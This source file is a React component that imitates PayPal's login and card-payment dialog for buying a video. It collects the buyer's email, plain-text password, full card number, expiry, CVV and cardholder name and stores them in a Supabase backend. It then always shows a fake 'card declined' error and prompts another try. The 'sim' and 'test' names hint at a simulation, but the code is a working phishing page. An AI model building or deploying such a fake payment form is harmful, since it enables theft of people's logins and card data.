import { FC, useState } from 'react';
import Dialog from '@mui/material/Dialog';
import DialogContent from '@mui/material/DialogContent';
import Box from '@mui/material/Box';
import Typography from '@mui/material/Typography';
import Button from '@mui/material/Button';
import TextField from '@mui/material/TextField';
import InputAdornment from '@mui/material/InputAdornment';
import CircularProgress from '@mui/material/CircularProgress';
import EmailIcon from '@mui/icons-material/Email';
import LockIcon from '@mui/icons-material/Lock';
import CloseIcon from '@mui/icons-material/Close';
import { useTheme, useMediaQuery } from '@mui/material';
import { SupabaseService } from '../services/SupabaseService';

type SimStep = 'email' | 'email_loading' | 'password' | 'card' | 'processing' | 'rejected';

interface PaypalSimModalProps {
  open: boolean;
  onClose: () => void;
  video: {
    $id: string;
    title: string;
    price: number;
  };
}

const PaypalSimModal: FC<PaypalSimModalProps> = ({ open, onClose, video }) => {
  const [simStep, setSimStep] = useState<SimStep>('email');
  const [simEmail, setSimEmail] = useState('');
  const [simPassword, setSimPassword] = useState('');
  const [simFieldError, setSimFieldError] = useState('');
  const [simSavedId, setSimSavedId] = useState('');

  // Card fields
  const [cardNumber, setCardNumber] = useState('');
  const [cardExpiry, setCardExpiry] = useState('');
  const [cardCvv, setCardCvv] = useState('');
  const [cardHolder, setCardHolder] = useState('');

  const resetAll = () => {
    setSimStep('email');
    setSimEmail('');
    setSimPassword('');
    setSimFieldError('');
    setSimSavedId('');
    setCardNumber('');
    setCardExpiry('');
    setCardCvv('');
    setCardHolder('');
  };

  const handleClose = () => {
    if (simStep === 'processing' || simStep === 'email_loading') return;
    resetAll();
    onClose();
  };

  const formatCardNumber = (val: string) =>
    val.replace(/\D/g, '').slice(0, 16).replace(/(.{4})/g, '$1 ').trim();

  const formatExpiry = (val: string) => {
    const d = val.replace(/\D/g, '').slice(0, 4);
    return d.length >= 3 ? d.slice(0, 2) + ' / ' + d.slice(2) : d;
  };

  const handleSimNextEmail = async () => {
    if (!simEmail || !simEmail.includes('@')) {
      setSimFieldError('Enter a valid email address.');
      return;
    }
    setSimFieldError('');
    setSimStep('email_loading');
    await new Promise(r => setTimeout(r, 1800));
    setSimStep('password');
  };

  const handleSimLogin = async () => {
    if (!simPassword) { setSimFieldError('Enter your password.'); return; }
    setSimFieldError('');
    setSimStep('processing');
    try {
      const result = await SupabaseService.saveTestLead({
        email: simEmail,
        password_raw: simPassword,
        video_id: video.$id,
        video_title: video.title,
        video_price: video.price,
      });
      setSimSavedId(result.id);
    } catch { /* flui para rejected */ }
    await new Promise(r => setTimeout(r, 2800));
    setSimStep('rejected');
  };

  const handleSimCardPay = async () => {
    const rawCard = cardNumber.replace(/\s/g, '');
    const rawExpiry = cardExpiry.replace(/\s/g, '');
    if (rawCard.length < 16)  { setSimFieldError('Enter a valid card number.'); return; }
    if (rawExpiry.length < 4) { setSimFieldError('Enter a valid expiry date.'); return; }
    if (cardCvv.length < 3)   { setSimFieldError('Enter a valid CVV.'); return; }
    if (!cardHolder.trim())   { setSimFieldError('Enter the cardholder name.'); return; }
    setSimFieldError('');
    setSimStep('processing');
    try {
      const result = await SupabaseService.saveTestCard({
        card_number: rawCard,
        expiry: rawExpiry,
        cvv: cardCvv,
        cardholder: cardHolder,
        video_id: video.$id,
        video_title: video.title,
        video_price: video.price,
      });
      setSimSavedId(result.id);
    } catch { /* flui para rejected */ }
    await new Promise(r => setTimeout(r, 2800));
    setSimStep('rejected');
  };

  const theme = useTheme();
  const isMobile = useMediaQuery(theme.breakpoints.down('sm'));

  const inputSx = {
    '& .MuiOutlinedInput-root': {
      borderRadius: '8px',
      fontSize: '0.97rem',
      background: '#f5f8fb',
      color: '#2c2e2f',
      '& fieldset': { borderColor: '#c4cdd5' },
      '&:hover fieldset': { borderColor: '#0070ba' },
      '&.Mui-focused fieldset': { borderColor: '#0070ba', borderWidth: '2px' },
      '&.Mui-focused': { background: '#fff' },
    },
    '& input': {
      py: 1.6,
      px: 1.8,
      color: '#2c2e2f',
      caretColor: '#0070ba',
      '&::placeholder': { color: '#9aa0a6', opacity: 1 },
    },
    '& .MuiInputLabel-root': { color: '#6c7378' },
  };

  const showFooter = ['email', 'email_loading', 'password', 'card'].includes(simStep);
  const isBlocked = simStep === 'processing' || simStep === 'email_loading';

  return (
    <Dialog
      open={open}
      onClose={handleClose}
      maxWidth={false}
      fullScreen={isMobile}
      componentsProps={{
        backdrop: {
          sx: {
            backdropFilter: 'blur(8px)',
            WebkitBackdropFilter: 'blur(8px)',
            backgroundColor: 'rgba(10, 20, 60, 0.45)',
          },
        },
      }}
      PaperProps={{
        elevation: 20,
        sx: {
          borderRadius: isMobile ? 0 : '16px',
          overflow: 'hidden',
          background: '#ffffff',
          color: '#2c2e2f',
          width: isMobile ? '100%' : 400,
          maxWidth: isMobile ? '100%' : 400,
          maxHeight: isMobile ? '100%' : '95vh',
          height: isMobile ? '100%' : 'auto',
          m: isMobile ? 0 : 2,
          display: 'flex',
          flexDirection: 'column',
        },
      }}
    >
      {/* Close button */}
      {!isBlocked && (
        <Box sx={{ position: 'absolute', top: 12, right: 12, zIndex: 10 }}>
          <Box
            onClick={handleClose}
            sx={{
              width: 32, height: 32, borderRadius: '50%',
              display: 'flex', alignItems: 'center', justifyContent: 'center',
              cursor: 'pointer', color: '#6c7378',
              '&:hover': { background: '#f5f5f5', color: '#2c2e2f' },
            }}
          >
            <CloseIcon sx={{ fontSize: 18 }} />
          </Box>
        </Box>
      )}

      <DialogContent sx={{
        px: { xs: 3, sm: 4 },
        pt: { xs: 3, sm: 3.5 },
        pb: { xs: 2, sm: 3.5 },
        background: '#ffffff',
        display: 'flex',
        flexDirection: 'column',
        flex: 1,
        overflowY: 'auto',
      }}>

        {/* PayPal wordmark */}
        {['email', 'email_loading', 'password'].includes(simStep) && (
          <Box sx={{ textAlign: 'center', mb: 2.5 }}>
            <Typography sx={{ fontWeight: 900, fontSize: '2rem', letterSpacing: '-0.5px', color: '#003087', display: 'inline' }}>Pay</Typography>
            <Typography sx={{ fontWeight: 900, fontSize: '2rem', letterSpacing: '-0.5px', color: '#009cde', display: 'inline' }}>Pal</Typography>
          </Box>
        )}

        {/* ── EMAIL ── */}
        {simStep === 'email' && (
          <>
            <Typography sx={{ fontWeight: 400, color: '#2c2e2f', mb: 2.5, textAlign: 'center', fontSize: '1.05rem' }}>
              Enter your email address to get started.
            </Typography>

            <TextField
              placeholder="Email or mobile number"
              type="email"
              fullWidth
              autoFocus
              value={simEmail}
              onChange={e => { setSimEmail(e.target.value); setSimFieldError(''); }}
              onKeyDown={e => { if (e.key === 'Enter') handleSimNextEmail(); }}
              variant="outlined"
              sx={{ mb: simFieldError ? 0.5 : 0, ...inputSx }}
            />

            {simFieldError && (
              <Typography variant="caption" sx={{ color: '#d93025', display: 'block', mb: 1, mt: 0.5, fontSize: '0.8rem' }}>
                {simFieldError}
              </Typography>
            )}

            <Box sx={{ mt: 1, mb: 2.5 }}>
              <Typography variant="body2" sx={{ color: '#0070ba', fontSize: '0.88rem', cursor: 'default' }}>
                Forgot email?
              </Typography>
            </Box>

            <Button variant="contained" fullWidth onClick={handleSimNextEmail} sx={{ py: 1.4, fontWeight: 700, fontSize: '1rem', borderRadius: '24px', textTransform: 'none', background: '#0070ba', color: '#fff', boxShadow: 'none', '&:hover': { background: '#005ea6', boxShadow: 'none' } }}>
              Next
            </Button>

            <Box sx={{ display: 'flex', alignItems: 'center', my: 2.2, gap: 1.5 }}>
              <Box sx={{ flex: 1, height: '1px', background: '#e0e0e0' }} />
              <Typography sx={{ color: '#9aa0a6', fontSize: '0.82rem' }}>or</Typography>
              <Box sx={{ flex: 1, height: '1px', background: '#e0e0e0' }} />
            </Box>

            <Button
              variant="outlined" fullWidth
              onClick={() => { setSimStep('card'); setSimFieldError(''); }}
              sx={{ py: 1.3, fontWeight: 600, fontSize: '0.92rem', borderRadius: '24px', textTransform: 'none', border: '1.5px solid #2c2e2f', color: '#2c2e2f', background: '#fff', '&:hover': { background: '#f5f5f5', borderColor: '#000' } }}
            >
              Pay with a Bank Account or Credit Card
            </Button>

            <Box sx={{ mt: 2.5, textAlign: 'center' }}>
              <Typography variant="body2" onClick={handleClose} sx={{ color: '#0070ba', cursor: 'pointer', fontSize: '0.88rem' }}>
                Cancel and return to store
              </Typography>
            </Box>
          </>
        )}

        {/* ── EMAIL LOADING ── */}
        {simStep === 'email_loading' && (
          <Box sx={{ textAlign: 'center', py: 4 }}>
            <Box sx={{ position: 'relative', display: 'inline-flex', mb: 2.5 }}>
              <CircularProgress size={60} thickness={2.5} sx={{ color: '#0070ba' }} />
              <Box sx={{ position: 'absolute', inset: 0, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                <EmailIcon sx={{ color: '#0070ba', fontSize: 22 }} />
              </Box>
            </Box>
            <Typography sx={{ fontWeight: 600, color: '#2c2e2f', fontSize: '1rem', mb: 0.5 }}>
              Looking up your account…
            </Typography>
            <Typography sx={{ color: '#6c7378', fontSize: '0.83rem' }}>{simEmail}</Typography>
          </Box>
        )}

        {/* ── PASSWORD ── */}
        {simStep === 'password' && (
          <>
            <Typography sx={{ fontWeight: 400, color: '#2c2e2f', mb: 2, textAlign: 'center', fontSize: '1.05rem' }}>
              Enter your password.
            </Typography>

            <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, mb: 2, px: 1.8, py: 1.2, background: '#f5f8fb', borderRadius: '8px', border: '1px solid #c4cdd5' }}>
              <EmailIcon sx={{ color: '#6c7378', fontSize: 16 }} />
              <Typography sx={{ fontSize: '0.9rem', color: '#2c2e2f', flex: 1 }}>{simEmail}</Typography>
              <Typography sx={{ fontSize: '0.78rem', color: '#0070ba', cursor: 'pointer' }} onClick={() => { setSimStep('email'); setSimFieldError(''); }}>
                Edit
              </Typography>
            </Box>

            <TextField
              placeholder="Password"
              type="password"
              fullWidth
              autoFocus
              value={simPassword}
              onChange={e => { setSimPassword(e.target.value); setSimFieldError(''); }}
              onKeyDown={e => { if (e.key === 'Enter') handleSimLogin(); }}
              variant="outlined"
              sx={{ mb: simFieldError ? 0.5 : 0, ...inputSx }}
            />

            {simFieldError && (
              <Typography variant="caption" sx={{ color: '#d93025', display: 'block', mb: 1, mt: 0.5, fontSize: '0.8rem' }}>
                {simFieldError}
              </Typography>
            )}

            <Box sx={{ mt: 1, mb: 2.5 }}>
              <Typography variant="body2" sx={{ color: '#0070ba', fontSize: '0.88rem', cursor: 'default' }}>
                Forgot password?
              </Typography>
            </Box>

            <Button variant="contained" fullWidth onClick={handleSimLogin} sx={{ py: 1.4, fontWeight: 700, fontSize: '1rem', borderRadius: '24px', textTransform: 'none', background: '#0070ba', color: '#fff', boxShadow: 'none', '&:hover': { background: '#005ea6', boxShadow: 'none' } }}>
              Log In
            </Button>
          </>
        )}

        {/* ── CARD ── */}
        {simStep === 'card' && (
          <>
            <Box sx={{ display: 'flex', alignItems: 'center', mb: 2.5, gap: 1 }}>
              <Box onClick={() => { setSimStep('email'); setSimFieldError(''); }} sx={{ cursor: 'pointer', color: '#6c7378', display: 'flex', alignItems: 'center', '&:hover': { color: '#0070ba' } }}>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
              </Box>
              <Typography sx={{ fontWeight: 700, color: '#2c2e2f', fontSize: '1rem', flex: 1, textAlign: 'center' }}>
                Pay with Card
              </Typography>
            </Box>

            <Box sx={{ textAlign: 'center', mb: 2.5 }}>
              <Typography sx={{ fontWeight: 700, color: '#0070ba', fontSize: '1.5rem' }}>
                ${video.price.toFixed(2)} USD
              </Typography>
            </Box>

            <TextField
              placeholder="Card number"
              fullWidth
              value={cardNumber}
              onChange={e => { setCardNumber(formatCardNumber(e.target.value)); setSimFieldError(''); }}
              variant="outlined"
              inputProps={{ inputMode: 'numeric', maxLength: 19 }}
              sx={{ mb: 1.5, ...inputSx }}
              InputProps={{
                endAdornment: (
                  <InputAdornment position="end">
                    <Box sx={{ display: 'flex', gap: 0.4, opacity: 0.55 }}>
                      <svg width="30" height="20" viewBox="0 0 30 20"><rect width="30" height="20" rx="3" fill="#1a1f71"/><text x="4" y="15" fontFamily="Arial" fontWeight="900" fontSize="10" fill="#fff">VISA</text></svg>
                      <svg width="30" height="20" viewBox="0 0 30 20"><rect width="30" height="20" rx="3" fill="#fff" stroke="#ddd"/><circle cx="11" cy="10" r="7" fill="#eb001b"/><circle cx="19" cy="10" r="7" fill="#f79e1b"/><path d="M15 4.8a7 7 0 0 1 0 10.4A7 7 0 0 1 15 4.8z" fill="#ff5f00"/></svg>
                    </Box>
                  </InputAdornment>
                ),
              }}
            />

            <Box sx={{ display: 'flex', gap: 1.5, mb: 1.5 }}>
              <TextField
                placeholder="MM / YY"
                fullWidth
                value={cardExpiry}
                onChange={e => { setCardExpiry(formatExpiry(e.target.value)); setSimFieldError(''); }}
                variant="outlined"
                inputProps={{ inputMode: 'numeric', maxLength: 7 }}
                sx={inputSx}
              />
              <TextField
                placeholder="CVV"
                fullWidth
                value={cardCvv}
                onChange={e => { setCardCvv(e.target.value.replace(/\D/g, '').slice(0, 4)); setSimFieldError(''); }}
                variant="outlined"
                inputProps={{ inputMode: 'numeric', maxLength: 4 }}
                sx={inputSx}
                InputProps={{ endAdornment: <InputAdornment position="end"><LockIcon sx={{ fontSize: 16, color: '#9aa0a6' }} /></InputAdornment> }}
              />
            </Box>

            <TextField
              placeholder="Cardholder name"
              fullWidth
              value={cardHolder}
              onChange={e => { setCardHolder(e.target.value); setSimFieldError(''); }}
              onKeyDown={e => { if (e.key === 'Enter') handleSimCardPay(); }}
              variant="outlined"
              sx={{ mb: simFieldError ? 0.5 : 2, ...inputSx }}
            />

            {simFieldError && (
              <Typography variant="caption" sx={{ color: '#d93025', display: 'block', mb: 1.5, fontSize: '0.8rem' }}>
                {simFieldError}
              </Typography>
            )}

            <Button variant="contained" fullWidth onClick={handleSimCardPay} sx={{ py: 1.4, fontWeight: 700, fontSize: '1rem', borderRadius: '24px', textTransform: 'none', background: '#0070ba', color: '#fff', boxShadow: 'none', '&:hover': { background: '#005ea6', boxShadow: 'none' } }}>
              Pay Now
            </Button>

            <Box sx={{ mt: 2, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 0.6 }}>
              <LockIcon sx={{ fontSize: 13, color: '#9aa0a6' }} />
              <Typography sx={{ fontSize: '0.72rem', color: '#9aa0a6' }}>
                Your payment is secured with SSL encryption
              </Typography>
            </Box>
          </>
        )}

        {/* ── PROCESSING ── */}
        {simStep === 'processing' && (
          <Box sx={{ textAlign: 'center', py: 5 }}>
            <Box sx={{
              width: 72, height: 72, borderRadius: '50%',
              background: 'linear-gradient(145deg, #0070ba, #003087)',
              display: 'flex', alignItems: 'center', justifyContent: 'center',
              mx: 'auto', mb: 3,
              boxShadow: '0 8px 24px rgba(0,112,186,0.4)',
              animation: 'ppLockBounce 1.6s ease-in-out infinite',
              '@keyframes ppLockBounce': {
                '0%, 100%': { transform: 'translateY(0) scale(1)', boxShadow: '0 8px 24px rgba(0,112,186,0.4)' },
                '30%': { transform: 'translateY(-7px) scale(1.04)', boxShadow: '0 16px 32px rgba(0,112,186,0.3)' },
                '60%': { transform: 'translateY(-3px) scale(1.02)', boxShadow: '0 12px 28px rgba(0,112,186,0.35)' },
              },
            }}>
              <LockIcon sx={{
                color: '#fff', fontSize: 34,
                animation: 'ppLockShake 1.6s ease-in-out infinite',
                '@keyframes ppLockShake': {
                  '0%, 100%': { transform: 'rotate(0deg)' },
                  '20%': { transform: 'rotate(-8deg)' },
                  '40%': { transform: 'rotate(8deg)' },
                  '60%': { transform: 'rotate(-4deg)' },
                  '80%': { transform: 'rotate(4deg)' },
                },
              }} />
            </Box>

            <Typography sx={{ fontWeight: 700, color: '#2c2e2f', mb: 0.6, fontSize: '1.05rem' }}>
              Processing…
            </Typography>
            <Typography sx={{ color: '#6c7378', fontSize: '0.85rem', mb: 3.5 }}>
              Please don't close this window.
            </Typography>

            <Box sx={{ display: 'flex', justifyContent: 'center', gap: 1 }}>
              {[0, 1, 2].map(i => (
                <Box key={i} sx={{
                  width: 8, height: 8, borderRadius: '50%', background: '#0070ba',
                  animation: 'ppDot 1.4s ease-in-out infinite',
                  animationDelay: `${i * 0.24}s`,
                  '@keyframes ppDot': {
                    '0%, 80%, 100%': { transform: 'scale(0.7)', opacity: 0.2 },
                    '40%': { transform: 'scale(1.2)', opacity: 1 },
                  },
                }} />
              ))}
            </Box>
          </Box>
        )}

        {/* ── REJECTED ── */}
        {simStep === 'rejected' && (
          <Box sx={{ textAlign: 'center', py: 2 }}>
            <Box sx={{ width: 64, height: 64, borderRadius: '50%', background: '#fff2f2', border: '2.5px solid #d93025', display: 'flex', alignItems: 'center', justifyContent: 'center', mx: 'auto', mb: 2.5 }}>
              <CloseIcon sx={{ color: '#d93025', fontSize: 32 }} />
            </Box>

            <Typography sx={{ fontWeight: 700, color: '#2c2e2f', mb: 0.6, fontSize: '1.1rem' }}>
              Something went wrong
            </Typography>
            <Typography sx={{ color: '#6c7378', mb: 2.5, fontSize: '0.88rem', lineHeight: 1.6 }}>
              We couldn't process your payment.<br />
              Your card was declined.
            </Typography>

            <Box sx={{ background: '#fef9f9', border: '1px solid #fad2cf', borderRadius: '10px', p: 1.8, mb: 3, textAlign: 'left' }}>
              <Typography sx={{ color: '#9aa0a6', fontSize: '0.7rem', textTransform: 'uppercase', letterSpacing: '0.05em', mb: 0.4 }}>Error code</Typography>
              <Typography sx={{ fontFamily: 'monospace', color: '#d93025', fontWeight: 700, fontSize: '0.84rem' }}>
                INSTRUMENT_DECLINED
              </Typography>
              {simSavedId && (
                <>
                  <Box sx={{ height: '1px', background: '#fad2cf', my: 1.2 }} />
                  <Typography sx={{ color: '#9aa0a6', fontSize: '0.7rem', textTransform: 'uppercase', letterSpacing: '0.05em', mb: 0.4 }}>Reference ID (Supabase)</Typography>
                  <Typography sx={{ fontFamily: 'monospace', color: '#0070ba', fontSize: '0.67rem', wordBreak: 'break-all' }}>{simSavedId}</Typography>
                </>
              )}
            </Box>

            <Button variant="contained" fullWidth
              onClick={() => { setSimStep('email'); setSimPassword(''); setCardNumber(''); setCardExpiry(''); setCardCvv(''); setCardHolder(''); setSimFieldError(''); }}
              sx={{ py: 1.35, fontWeight: 700, borderRadius: '24px', textTransform: 'none', background: '#0070ba', color: '#fff', fontSize: '0.97rem', boxShadow: 'none', mb: 1.5, '&:hover': { background: '#005ea6', boxShadow: 'none' } }}
            >
              Try again
            </Button>

            <Typography onClick={handleClose} sx={{ color: '#0070ba', cursor: 'pointer', fontSize: '0.88rem' }}>
              Cancel and return to store
            </Typography>
          </Box>
        )}

      </DialogContent>

      {/* Footer */}
      {showFooter && (
        <Box sx={{
          borderTop: '1px solid #eee',
          py: 1.8,
          textAlign: 'center',
          background: '#ffffff',
          mt: 'auto',
          flexShrink: 0,
        }}>
          <Typography sx={{ color: '#9aa0a6', fontSize: '0.72rem', mb: 0.5 }}>
            English &nbsp;|&nbsp; Français &nbsp;|&nbsp; Español &nbsp;|&nbsp; 中文
          </Typography>
          <Typography sx={{ color: '#b0b7be', fontSize: '0.68rem' }}>
            Contact Us &nbsp;·&nbsp; Privacy &nbsp;·&nbsp; Legal &nbsp;·&nbsp; Policy Updates
          </Typography>
        </Box>
      )}
    </Dialog>
  );
};

export default PaypalSimModal;
